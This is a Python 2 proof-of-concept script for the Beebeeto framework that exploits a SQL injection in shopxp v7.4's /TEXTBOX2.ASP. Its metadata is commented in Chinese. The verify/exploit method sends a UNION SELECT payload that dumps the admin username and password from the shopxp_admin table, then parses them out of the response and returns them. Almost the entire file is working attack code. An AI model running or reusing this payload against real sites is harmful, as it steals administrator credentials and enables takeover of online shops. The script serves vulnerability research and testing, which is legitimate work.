#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0040',           # 由Beebeeto官方编辑
            'name': 'shopxp v7.4 /textbox2.asp SQL注入漏洞 EXP',  # 名称
            'author': 'Bug',                   # 作者
            'create_date': '2014-09-29',    # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'xpshop',  # 漏洞所涉及的应用名称
            'vul_version': ['7.4'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['SQL Injection', 'shopxp漏洞'],  # 漏洞相关tag
            'desc': 'N/A',  # 漏洞描述
            'references': ['http://www.webshell.cc/1154.html'],  # 参考链接
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select"
               "%201,2,admin%2bpassword,4,5,6,7%20from%20shopxp_admin")
        verify_url = args['options']['target'] + payload
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        pattern = re.compile(r'.*?<body[^>]*?>(?P<account>[^<>]*?)</body>',re.I|re.S)
        match = pattern.match(content)
        if match == None or match.group('account').strip()=="":
            args['success'] = False
            return args
        account = match.group('account').strip()
        username = account[:-16]
        password = account[-16:]
        args['success'] = True
        args['poc_ret']['vul_url'] = verify_url
        args['poc_ret']['Username'] = username
        args['poc_ret']['Password'] = password
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())